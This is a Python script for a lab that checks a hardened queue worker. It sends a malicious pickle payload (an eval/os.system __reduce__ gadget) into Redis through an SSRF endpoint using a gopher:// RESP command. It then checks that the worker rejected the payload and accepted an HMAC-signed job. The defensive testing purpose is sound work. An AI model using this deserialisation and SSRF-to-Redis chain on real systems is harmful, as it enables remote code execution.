import argparse
import hashlib
import hmac
import json
import pickle
import subprocess
import sys
import time
import urllib.parse
from datetime import datetime, timezone

import requests


class RCEPayload:
    def __init__(self, command: str):
        self.command = command

    def __reduce__(self):
        expression = f"__import__('os').system({self.command!r})"
        return (eval, (expression,))


def sign_payload(payload: dict, secret: str) -> str:
    message = json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8")
    return hmac.new(secret.encode("utf-8"), message, hashlib.sha256).hexdigest()


def build_resp_command(parts: list[bytes]) -> bytes:
    frame = [f"*{len(parts)}\r\n".encode("utf-8")]
    for part in parts:
        frame.append(f"${len(part)}\r\n".encode("utf-8"))
        frame.append(part)
        frame.append(b"\r\n")
    return b"".join(frame)


def send_redis_via_ssrf(web_base_url: str, redis_host: str, redis_port: int, command: bytes) -> requests.Response:
    gopher_url = (
        f"gopher://{redis_host}:{redis_port}/_"
        f"{urllib.parse.quote_from_bytes(command, safe='')}"
    )
    return requests.get(
        f"{web_base_url.rstrip('/')}/fetch",
        params={"url": gopher_url},
        timeout=10,
    )


def get_deployment_logs(namespace: str, deployment: str, tail: int = 200) -> str:
    result = subprocess.run(
        ["kubectl", "-n", namespace, "logs", f"deploy/{deployment}", "--tail", str(tail)],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        raise RuntimeError(result.stderr.strip() or result.stdout.strip())
    return result.stdout


def get_compose_logs(compose_file: str, service: str, tail: int = 200) -> str:
    result = subprocess.run(
        [
            "docker",
            "compose",
            "-f",
            compose_file,
            "logs",
            service,
            "--tail",
            str(tail),
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        raise RuntimeError(result.stderr.strip() or result.stdout.strip())
    return result.stdout


def network_policy_exists(namespace: str) -> bool:
    result = subprocess.run(
        ["kubectl", "-n", namespace, "get", "networkpolicy", "--no-headers"],
        capture_output=True,
        text=True,
        check=False,
    )
    return result.returncode == 0 and bool(result.stdout.strip())


def marker_exists_k8s(namespace: str, deployment: str, marker_path: str) -> bool:
    result = subprocess.run(
        [
            "kubectl",
            "-n",
            namespace,
            "exec",
            f"deploy/{deployment}",
            "--",
            "sh",
            "-c",
            f"test -f {marker_path}",
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    return result.returncode == 0


def marker_exists_compose(compose_file: str, service: str, marker_path: str) -> bool:
    result = subprocess.run(
        [
            "docker",
            "compose",
            "-f",
            compose_file,
            "exec",
            "-T",
            service,
            "sh",
            "-c",
            f"test -f {marker_path}",
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    return result.returncode == 0


def main() -> None:
    parser = argparse.ArgumentParser(description="Blue team verification for secure worker")
    parser.add_argument("--mode", choices=["k8s", "compose"], default="k8s")
    parser.add_argument("--web-base-url", default="http://localhost:5000", help="Vulnerable web URL")
    parser.add_argument("--redis-host", default="redis", help="Redis host visible from web pod")
    parser.add_argument("--redis-port", type=int, default=6379)
    parser.add_argument("--secure-queue", default="mail_jobs_secure")
    parser.add_argument("--hmac-secret", default="supersecret_lab_key")
    parser.add_argument("--namespace", default="redis-injection-lab")
    parser.add_argument("--secure-deployment", default="worker-secure")
    parser.add_argument("--compose-file", default="docker-compose.vulnerable.yml")
    parser.add_argument("--compose-service", default="worker-secure")
    parser.add_argument("--marker-path", default="/tmp/secure_worker_broken.txt")
    parser.add_argument("--wait-seconds", type=int, default=3)
    args = parser.parse_args()

    malicious_pickle = pickle.dumps(
        RCEPayload("sh -c 'echo SHOULD_NOT_RUN > /tmp/secure_worker_broken.txt'"),
        protocol=4,
    )
    attack_command = build_resp_command([b"LPUSH", args.secure_queue.encode("utf-8"), malicious_pickle])
    attack_response = send_redis_via_ssrf(args.web_base_url, args.redis_host, args.redis_port, attack_command)
    print("[blue-team] Sent malicious payload to secure queue:", attack_response.status_code)

    payload = {
        "email": "blue-team@example.com",
        "report_type": "daily_summary",
        "source": "blue_team_verify",
        "requested_at": datetime.now(timezone.utc).isoformat(),
    }
    envelope = {
        "payload": payload,
        "signature": sign_payload(payload, args.hmac_secret),
    }
    signed_job = json.dumps(envelope, separators=(",", ":"), sort_keys=True).encode("utf-8")
    signed_command = build_resp_command([b"LPUSH", args.secure_queue.encode("utf-8"), signed_job])
    signed_response = send_redis_via_ssrf(args.web_base_url, args.redis_host, args.redis_port, signed_command)
    print("[blue-team] Sent valid signed payload to secure queue:", signed_response.status_code)

    time.sleep(args.wait_seconds)

    if args.mode == "k8s":
        logs = get_deployment_logs(args.namespace, args.secure_deployment, tail=300)
    else:
        logs = get_compose_logs(args.compose_file, args.compose_service, tail=300)

    reject_found = (
        "[secure-worker] Dropped non-UTF8 job" in logs
        or "[secure-worker] Dropped invalid JSON job" in logs
    )
    accept_found = "[secure-worker] Accepted signed job for blue-team@example.com" in logs

    if args.mode == "k8s":
        network_policy_found = network_policy_exists(args.namespace)
        marker_exists = marker_exists_k8s(args.namespace, args.secure_deployment, args.marker_path)
    else:
        network_policy_found = None
        marker_exists = marker_exists_compose(args.compose_file, args.compose_service, args.marker_path)

    marker_safe = not marker_exists

    print("\nBlue Team Checklist")
    print(f"[{'x' if reject_found else ' '}] Rejected malicious payload")
    print(f"[{'x' if accept_found else ' '}] Accepted valid signed payload")
    print(f"[{'x' if marker_safe else ' '}] Malicious marker was NOT created in secure worker")
    if network_policy_found is None:
        print("[-] NetworkPolicy check skipped in compose mode")
    else:
        print(f"[{'x' if network_policy_found else ' '}] NetworkPolicy objects found")

    if not reject_found or not accept_found or not marker_safe:
        print("\n[blue-team] worker-secure logs tail:")
        print(logs)

    checks_ok = reject_found and accept_found and marker_safe
    if network_policy_found is not None:
        checks_ok = checks_ok and network_policy_found

    if not checks_ok:
        sys.exit(1)


if __name__ == "__main__":
    main()
